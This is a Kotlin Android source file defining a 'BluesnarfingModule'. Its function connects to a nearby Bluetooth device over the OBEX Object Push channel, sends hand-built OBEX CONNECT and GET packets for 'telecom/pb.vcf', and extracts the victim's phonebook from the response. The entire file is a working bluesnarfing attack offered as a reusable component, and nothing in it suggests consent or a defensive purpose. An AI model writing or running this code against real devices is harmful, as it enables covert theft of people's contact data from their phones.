package com.hereliesaz.blusnu.data

import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothSocket
import java.io.IOException
import java.util.UUID

class BluesnarfingModule {

    // OBEX Object Push Profile UUID
    private val OBEX_OPP_UUID: UUID = UUID.fromString("00001105-0000-1000-8000-00805f9b34fb")

    fun getPhonebook(device: BluetoothDevice): String {
        var socket: BluetoothSocket? = null
        try {
            socket = device.createRfcommSocketToServiceRecord(OBEX_OPP_UUID)
            socket.connect()

            val outputStream = socket.outputStream
            val inputStream = socket.inputStream

            // OBEX CONNECT request
            val connectRequest = byteArrayOf(
                0x80.toByte(), 0x00, 0x07, 0x10, 0x00, 0x20, 0x00
            )
            outputStream.write(connectRequest)

            // Read the response
            val connectResponse = ByteArray(1024)
            val connectResponseLength = inputStream.read(connectResponse)
            if (connectResponse[0] != 0xA0.toByte()) {
                return "OBEX CONNECT failed"
            }

            // OBEX GET request for phonebook
            val fileName = "telecom/pb.vcf".toByteArray(Charsets.UTF_16BE)
            val getRequest = byteArrayOf(
                0x83.toByte(), 0x00, (10 + fileName.size).toByte(), 0x01, 0x00
            ) + fileName + byteArrayOf(0xcb.toByte(), 0x00, 0x00, 0x00, 0x01)
            outputStream.write(getRequest)

            // Read the response
            val getResponse = ByteArray(4096)
            val getResponseLength = inputStream.read(getResponse)

            return if (getResponse[0] == 0xA0.toByte()) {
                // Success, parse the response
                val bodyHeaderIndex = getResponse.indexOf(0x48.toByte())
                if (bodyHeaderIndex != -1) {
                    val bodyLength = (getResponse[bodyHeaderIndex + 1].toInt() shl 8) or getResponse[bodyHeaderIndex + 2].toInt()
                    val bodyStartIndex = bodyHeaderIndex + 3
                    val bodyEndIndex = bodyStartIndex + bodyLength - 1
                    String(getResponse, bodyStartIndex, bodyEndIndex - bodyStartIndex)
                } else {
                    "Phonebook data not found in response"
                }
            } else {
                "OBEX GET failed"
            }
        } catch (e: IOException) {
            e.printStackTrace()
            return "Error connecting to device: ${e.message}"
        } finally {
            try {
                socket?.close()
            } catch (e: IOException) {
                e.printStackTrace()
            }
        }
    }
}
